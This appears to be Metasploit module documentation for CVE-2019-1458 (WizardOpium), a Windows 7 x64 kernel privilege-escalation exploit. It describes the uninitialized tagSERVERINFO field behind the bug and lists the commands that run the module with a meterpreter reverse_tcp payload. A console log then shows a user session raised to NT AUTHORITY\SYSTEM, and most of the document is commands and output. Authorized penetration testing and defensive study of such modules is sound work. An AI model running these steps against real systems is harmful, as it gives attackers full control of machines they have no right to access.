## Vulnerable Application

This module exploits CVE-2019-1458, aka WizardOpium, a bug that occurs because a field within the tagSERVERINFO structure
at *(gpsi+0x154) was uninitialized, which allowed user mode attackers to set extra window data pointer in a
task switch window (designated by the FNID_SWITCH window class), which would otherwise only be able to be
set by the kernel. By setting this extra window data pointer, an attacker can write a limited amount of data
to an arbitrary kernel address in memory, thus providing them with an arbitrary kernel write primitive than can
be used to elevate privileges to SYSTEM.

This module has been tested against Windows 7 x64 SP1. Offsets
within the solution may need to be adjusted to work with other versions
of Windows.

## Verification Steps

1. Get a non-SYSTEM meterpreter session on Windows 7 SP1 x64
1. `use exploit/windows/local/cve_2019_1458_wizardopium`
1. `set session <session>`
1. `set payload windows/x64/meterpreter/reverse_tcp`
1. `set LHOST <LHOST>`
1. `set LPORT 5555`
1. `exploit`
1. Get a SYSTEM session

## Scenarios

### Windows 7 SP1 x64 with win32k.sys Version 6.1.7601.17514

```
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 172.24.15.185:4444
[*] Sending stage (200262 bytes) to 172.24.15.185
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.24.15.185:4444) at 2020-10-09 15:18:22 -0500

meterpreter > getuid
Server username: test-PC\test
meterpreter > privs
[-] Unknown command: privs.
meterpreter > getsystem
[-] 2001: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2019_1458_wizardopium
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options

Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS  notepad.exe      yes       Name of process to spawn and inject dll into.
   SESSION                   yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.24.12.125    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64


msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set LPORT 6633
LPORT => 6633
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > exploit

[*] Started reverse TCP handler on 172.24.12.125:6633
[*] Executing automatic check (disable AutoCheck to override)
[+] Triggering the exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 172.24.15.185
[*] Meterpreter session 2 opened (172.24.12.125:6633 -> 172.24.15.185:49223) at 2020-10-09 15:19:07 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRelabelPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > sysinfo
Computer        : TEST-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  test-PC\test @ TEST-PC         0.0.0.0:0 -> 172.24.15.185:4444 (172.24.15.185)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ TEST-PC  172.24.12.125:6633 -> 172.24.15.185:49223 (172.24.15.185)

msf6 exploit(windows/local/cve_2019_1458_wizardopium) >
```
